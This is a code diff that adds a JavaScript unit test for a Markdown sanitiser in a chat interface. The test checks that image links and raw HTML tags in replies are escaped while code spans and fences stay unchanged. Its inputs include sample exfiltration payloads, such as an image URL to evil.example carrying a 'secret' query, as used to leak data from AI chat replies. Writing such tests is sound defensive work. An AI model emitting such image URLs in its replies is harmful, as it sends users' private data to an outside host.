@@ -346,3 +346,19 @@ test('parse keeps icon overrides as strings of a sane length', () => {
   assert.deepEqual(config.parse(JSON.stringify({dockSymbols: ['f048b']})).dockSymbols, {});
   assert.deepEqual(config.defaults().dockSymbols, {});
 });
+
+test('chat replies keep their Markdown but never fetch images or read tags', () => {
+  const s = ctx.safeMarkdown;
+  assert.equal(s('look ![x](https://evil.example/?q=secret) here'), 'look \\![x](https://evil.example/?q=secret) here');
+  assert.equal(s('![a][ref]'), '\\![a][ref]');
+  assert.equal(s('<img src="https://evil.example/p.png">'), '&lt;img src="https://evil.example/p.png">');
+  assert.equal(s('</div><!-- c --><?x?>'), '&lt;/div>&lt;!-- c -->&lt;?x?>');
+  assert.equal(s('**bold** and [a link](https://example.com) stay'), '**bold** and [a link](https://example.com) stay');
+  assert.equal(s('2 < 3 and a<b'), '2 < 3 and a&lt;b');
+  // Code is shown as written.
+  assert.equal(s('use `<div>` or ``a`![b](c)`` here <i>'), 'use `<div>` or ``a`![b](c)`` here &lt;i>');
+  const fenced = '```html\n<img src=x>\n![a](b)\n```\n<img src=y>';
+  assert.equal(s(fenced), '```html\n<img src=x>\n![a](b)\n```\n&lt;img src=y>');
+  assert.equal(s('~~~~\n<b>\n~~~\nstill code <b>\n~~~~\n<b>'), '~~~~\n<b>\n~~~\nstill code <b>\n~~~~\n&lt;b>');
+  assert.equal(s('a lone ` then <b>'), 'a lone ` then &lt;b>');
+});
